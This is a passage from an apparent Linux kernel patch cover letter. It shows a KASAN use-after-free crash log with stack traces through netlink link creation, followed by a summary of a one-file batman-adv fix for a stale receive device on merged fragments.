  39:	75 de                	jne    0x19
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63

Code starting with the faulting instruction
===========================================
   0:	5b                   	pop    %rbx
   1:	c3                   	ret
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   9:	83 e2 39             	and    $0x39,%edx
   c:	83 fa 08             	cmp    $0x8,%edx
   f:	75 de                	jne    0xffffffffffffffef
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
[  234.448279] [      C0] RSP: 002b:00007ffedeb93690 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  234.448306] [      C0] RAX: ffffffffffffffda RBX: 00007ff350eaf780 RCX: 00007ff350f43687
[  234.448312] [      C0] RDX: 0000000000000032 RSI: 00007ff3508499d0 RDI: 0000000000000003
[  234.448317] [      C0] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  234.448321] [      C0] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  234.448325] [      C0] R13: 0000000000000000 R14: 00000000006ff020 R15: 0000000000a83590
[  234.448353] [      C0]  </TASK>

[  234.448571] [      C0] Allocated by task 10434:
[  234.448590] [      C0]  kasan_save_stack (build/../mm/kasan/common.c:57)
[  234.448610] [      C0]  kasan_save_track (build/../mm/kasan/common.c:78)
[  234.448623] [      C0]  __kasan_kmalloc (build/../mm/kasan/common.c:398 build/../mm/kasan/common.c:415)
[  234.448635] [      C0]  __kmalloc_node_noprof (build/../mm/slub.c:4756 (discriminator 1) build/../mm/slub.c:4883 (discriminator 1) build/../mm/slub.c:5294 (discriminator 1) build/../mm/slub.c:5301 (discriminator 1))
[  234.448658] [      C0]  alloc_netdev_mqs (build/../net/core/dev.c:12019)
[  234.448677] [      C0]  rtnl_create_link (build/../net/core/rtnetlink.c:3652)
[  234.448694] [      C0]  __rtnl_newlink+0xd20/0x14f0
[  234.448708] [      C0]  rtnl_newlink (build/../net/core/rtnetlink.c:4000)
[  234.448721] [      C0]  rtnetlink_rcv_msg (build/../net/core/rtnetlink.c:6984)
[  234.448733] [      C0]  netlink_rcv_skb (build/../net/netlink/af_netlink.c:2547)
[  234.448766] [      C0]  netlink_unicast (build/../include/linux/instrumented.h:112 build/../include/linux/atomic/atomic-instrumented.h:104 build/../net/netlink/af_netlink.c:1314 build/../net/netlink/af_netlink.c:1344)
[  234.448778] [      C0]  netlink_sendmsg (build/../net/netlink/af_netlink.c:1875)
[  234.448790] [      C0]  ____sys_sendmsg (build/../net/socket.c:790 (discriminator 1) build/../net/socket.c:2695 (discriminator 1))
[  234.448802] [      C0]  ___sys_sendmsg (build/../net/socket.c:2749)
[  234.448815] [      C0]  __sys_sendmsg (build/../net/socket.c:593 build/../net/socket.c:2780)
[  234.448828] [      C0]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  234.448842] [      C0]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)

[  234.448879] [      C0] Freed by task 10659:
[  234.448890] [      C0]  kasan_save_stack (build/../mm/kasan/common.c:57)
[  234.448903] [      C0]  kasan_save_track (build/../mm/kasan/common.c:78)
[  234.448915] [      C0]  kasan_save_free_info (build/../mm/kasan/generic.c:584)
[  234.448934] [      C0]  __kasan_slab_free (build/../mm/kasan/common.c:249 build/../mm/kasan/common.c:285)
[  234.448947] [      C0]  kfree (build/../mm/slub.c:5807 (discriminator 3) build/../mm/slub.c:6253 (discriminator 3) build/../mm/slub.c:6565 (discriminator 3))
[  234.448959] [      C0]  device_release (build/../drivers/gpu/drm/vkms/vkms_configfs.c:749)
[  234.449008] [      C0]  kobject_put (build/../lib/kobject.c:677 build/../lib/kobject.c:720 build/../include/linux/kref.h:65 build/../lib/kobject.c:737)
[  234.449027] [      C0]  netdev_run_todo (build/../net/core/dev.c:11716 (discriminator 2))
[  234.449045] [      C0]  rtnetlink_rcv_msg (build/../net/core/rtnetlink.c:6984)
[  234.449069] [      C0]  netlink_rcv_skb (build/../net/netlink/af_netlink.c:2547)
[  234.449081] [      C0]  netlink_unicast (build/../include/linux/instrumented.h:112 build/../include/linux/atomic/atomic-instrumented.h:104 build/../net/netlink/af_netlink.c:1314 build/../net/netlink/af_netlink.c:1344)
[  234.449093] [      C0]  netlink_sendmsg (build/../net/netlink/af_netlink.c:1875)
[  234.449105] [      C0]  ____sys_sendmsg (build/../net/socket.c:790 (discriminator 1) build/../net/socket.c:2695 (discriminator 1))
[  234.449117] [      C0]  ___sys_sendmsg (build/../net/socket.c:2749)
[  234.449130] [      C0]  __sys_sendmsg (build/../net/socket.c:593 build/../net/socket.c:2780)
[  234.449143] [      C0]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  234.449156] [      C0]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)

[  234.449178] [      C0] The buggy address belongs to the object at ffff88807cd19000
which belongs to the cache kmalloc-cg-4k of size 4096
[  234.449196] [      C0] The buggy address is located 560 bytes inside of
freed 4096-byte region [ffff88807cd19000, ffff88807cd1a000)

[  234.449217] [      C0] The buggy address belongs to the physical page:
[  234.449234] [      C0] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0xffff88807cd1c000 pfn:0x7cd18
[  234.449265] [      C0] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  234.449276] [      C0] memcg:ffff88801b8a9b51
[  234.449286] [      C0] flags: 0xfff00000000240(workingset|head|node=0|zone=1|lastcpupid=0x7ff)
[  234.449312] [      C0] page_type: f5(slab)
[  234.449335] [      C0] raw: 00fff00000000240 ffff888100050f40 ffffea000452aa10 ffffea0004464c10
[  234.449347] [      C0] raw: ffff88807cd1c000 0000000000020001 00000001f5000000 ffff88801b8a9b51
[  234.449359] [      C0] head: 00fff00000000240 ffff888100050f40 ffffea000452aa10 ffffea0004464c10
[  234.449370] [      C0] head: ffff88807cd1c000 0000000000020001 00000001f5000000 ffff88801b8a9b51
[  234.449381] [      C0] head: 00fff00000000003 ffffea0001f34601 ffffffffffffffff 0000000000000000
[  234.449392] [      C0] head: 0000000700000008 0000000000000000 00000000ffffffff 0000000000000000
[  234.449401] [      C0] page dumped because: kasan: bad access detected
[  234.449416] [      C0] page_owner tracks the page as allocated
[  234.450282] [      C0] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 10382, tgid 10382 (systemd), ts 209620171625, free_ts 207177527654
[  234.452951] [      C0]  post_alloc_hook (build/../mm/page_alloc.c:6932)
[  234.452990] [      C0]  get_page_from_freelist (build/../mm/page_alloc.c:3815 (discriminator 1))
[  234.453004] [      C0]  __alloc_pages_noprof (build/../mm/internal.h:876 (discriminator 1) build/../mm/page_alloc.c:5272 (discriminator 1))
[  234.453017] [      C0]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  234.453041] [      C0]  new_slab (build/../mm/slub.c:882 build/../mm/slub.c:2291 build/../mm/slub.c:3497 build/../mm/slub.c:3525)
[  234.453053] [      C0]  ___slab_alloc (build/../include/linux/kasan.h:263 build/../mm/slub.c:5419)
[  234.453065] [      C0]  __slab_alloc.isra.0+0x5b/0xb0
[  234.453077] [      C0]  __kmalloc_node_noprof (build/../mm/slub.c:2458 (discriminator 1) build/../mm/slub.c:4580 (discriminator 1) build/../mm/slub.c:4898 (discriminator 1) build/../mm/slub.c:5294 (discriminator 1) build/../mm/slub.c:5301 (discriminator 1))
[  234.453090] [      C0]  seq_read_iter (build/../fs/seq_file.c:252)
[  234.453117] [      C0]  vfs_read (build/../include/linux/ioprio.h:41 build/../include/linux/ioprio.h:71 build/../include/linux/ioprio.h:84 build/../include/linux/fs.h:2195 build/../fs/read_write.c:489 build/../fs/read_write.c:574)
[  234.453139] [      C0]  ksys_read (build/../fs/read_write.c:714)
[  234.453150] [      C0]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  234.453165] [      C0]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
[  234.453178] [      C0] page last free pid 10382 tgid 10382 stack trace:
[  234.454069] [      C0]  free_unref_page+0x6a3/0x1050
[  234.454083] [      C0]  qlist_free_all (build/../mm/kasan/quarantine.c:176)
[  234.454097] [      C0]  kasan_quarantine_reduce (build/../mm/kasan/quarantine.c:286)
[  234.454109] [      C0]  __kasan_krealloc (build/../mm/kasan/common.c:441)
[  234.454122] [      C0]  krealloc_noprof+0x104/0x140
[  234.454146] [      C0]  copy_array.constprop.0 (build/../kernel/bpf/verifier.c:1273 (discriminator 3))
[  234.454195] [      C0]  copy_verifier_state+0x97c/0xea0
[  234.454209] [      C0]  pop_stack (build/../kernel/bpf/verifier.c:1681)
[  234.454222] [      C0]  do_check_common (build/../kernel/bpf/verifier.c:13620 build/../kernel/bpf/verifier.c:17654 build/../kernel/bpf/verifier.c:17789 build/../kernel/bpf/verifier.c:18804)
[  234.454241] [      C0]  bpf_check (build/../kernel/bpf/verifier.c:3134 (discriminator 1) build/../kernel/bpf/verifier.c:19996 (discriminator 1))
[  234.454254] [      C0]  bpf_prog_load (build/../kernel/bpf/syscall.c:3001)
[  234.454266] [      C0]  __sys_bpf (build/../include/linux/rcupdate.h:839 (discriminator 1) build/../kernel/bpf/syscall.c:5591 (discriminator 1) build/../kernel/bpf/syscall.c:6299 (discriminator 1))
[  234.454278] [      C0]  __x64_sys_bpf (build/../kernel/bpf/syscall.c:6361 (discriminator 1) build/../kernel/bpf/syscall.c:6359 (discriminator 1) build/../kernel/bpf/syscall.c:6359 (discriminator 1))
[  234.454290] [      C0]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  234.454304] [      C0]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)

[  234.454326] [      C0] Memory state around the buggy address:
[  234.454337] [      C0]  ffff88807cd19100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  234.454348] [      C0]  ffff88807cd19180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  234.454358] [      C0] >ffff88807cd19200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  234.454368] [      C0]                                      ^
[  234.454378] [      C0]  ffff88807cd19280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  234.454388] [      C0]  ffff88807cd19300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  234.454397] [      C0] ==================================================================
[  234.454519] [      C0] Disabling lock debugging due to kernel taint

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  batman-adv: fix stale receive device on merged fragments

 net/batman-adv/main.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0
